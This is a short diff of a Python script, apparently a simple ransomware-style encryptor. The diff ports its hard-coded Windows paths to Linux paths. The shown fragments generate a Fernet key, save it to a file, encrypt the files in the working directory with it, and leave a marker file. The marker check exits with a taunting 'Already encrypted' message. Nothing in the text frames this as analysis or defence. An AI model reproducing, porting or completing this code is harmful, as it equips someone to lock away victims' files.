@@ -4,7 +4,7 @@ import os
 from PyQt6.QtWidgets import *
 from cryptography.fernet import Fernet
 
-if os.path.exists(f"C:\\Users\\Public\\encrypted.key"):
+if os.path.exists(f"/home/encrypted.key"):
 	exit("Already encrypted ya 3beet")
 
 class GUI:
@@ -59,7 +59,7 @@ for file in os.listdir():
 
 key = Fernet.generate_key()
 
-with open(f"C:\\Users\\Public\\thekey.key", "wb") as thekey:
+with open(f"/home/thekey.key", "wb") as thekey:
 
 	thekey.write(key)
 
@@ -75,6 +75,6 @@ for file in files:
 
 		thefile.write(content_encrypted)
 
-with open(f"C:\\Users\\Public\\encrypted.key", "wb") as make_enc :
+with open(f"/home/encrypted.key", "wb") as make_enc :
 
 	make_enc.write(b'1')
